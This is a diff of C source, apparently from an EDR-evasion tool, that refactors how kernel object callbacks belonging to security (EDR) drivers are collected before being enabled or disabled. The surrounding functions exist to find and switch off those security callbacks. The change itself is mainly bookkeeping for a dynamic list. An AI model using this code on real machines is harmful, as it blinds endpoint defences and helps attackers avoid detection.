@@ -192,10 +192,7 @@ BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundOb
         for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List);
             cbEntry != ObjectType_Callbacks_List;
             cbEntry = ReadMemoryDWORD64(cbEntry)) {
-            if (FoundObjectCallbacks->index >= 256) {
-                _putts_or_not(TEXT("[!] No more space to store object callbacks !!! This should not happen. Exiting..."));
-                exit(1);
-            }
+            
             DWORD64 ObjectTypeField = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
             if (ObjectTypeField != ObjectType) {
                 _putts_or_not(TEXT("Unexpected value in callback entry (ObjectTypeField), exiting..."));
@@ -233,13 +230,13 @@ BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundOb
                     _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tCallback belongs to an EDR "));
                     if (Enabled) {
                         _putts_or_not(TEXT("and is enabled!"));
-                        struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index];
-                        cb->type = OBJECT_CALLBACK;
-                        cb->driver_name = driverNamePreOperation;
-                        cb->removed = FALSE;
-                        cb->callback_func = PreOperation;
-                        cb->addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
-                        FoundObjectCallbacks->index++;
+                        struct KRNL_CALLBACK cb;
+                        cb.type = OBJECT_CALLBACK;
+                        cb.driver_name = driverNamePreOperation;
+                        cb.removed = FALSE;
+                        cb.callback_func = PreOperation;
+                        cb.addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
+                        AddFoundKernelCallback(FoundObjectCallbacks, &cb);
                         found |= TRUE;
                     }
                     else {
@@ -257,18 +254,19 @@ BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundOb
                     _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tCallback belongs to an EDR "));
                     if (Enabled) {
                         _putts_or_not(TEXT("and is enabled!"));
-                        if (FoundObjectCallbacks->index != 0 &&
-                            FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index - 1].addresses.object_callback.enable_addr == cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled) {
+                        if (FoundObjectCallbacks->size != 0 &&
+                            FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->size - 1].type == OBJECT_CALLBACK &&
+                            FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->size - 1].addresses.object_callback.enable_addr == cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled) {
                             //skip if last callback function belong to the same callback entry (preoperation)
                             continue;
                         }
-                        struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->index];
-                        cb->type = OBJECT_CALLBACK;
-                        cb->driver_name = driverNamePostOperation;
-                        cb->removed = FALSE;
-                        cb->callback_func = PostOperation;
-                        cb->addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
-                        FoundObjectCallbacks->index++;
+                        struct KRNL_CALLBACK cb;
+                        cb.type = OBJECT_CALLBACK;
+                        cb.driver_name = driverNamePostOperation;
+                        cb.removed = FALSE;
+                        cb.callback_func = PostOperation;
+                        cb.addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
+                        AddFoundKernelCallback(FoundObjectCallbacks, &cb);
                         found |= TRUE;
                     }
                     else {
@@ -287,7 +285,7 @@ void EnableDisableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS
         _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
         return;
     }
-    for (DWORD64 i = 0; i < FoundObjectCallbacks->index; i++) {
+    for (DWORD64 i = 0; i < FoundObjectCallbacks->size; i++) {
         struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[i];
         if (cb->type == OBJECT_CALLBACK && cb->removed == enable) {
             _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t%s %s callback...\n"), enable ? TEXT("Enabling") : TEXT("Disabling"), cb->driver_name);
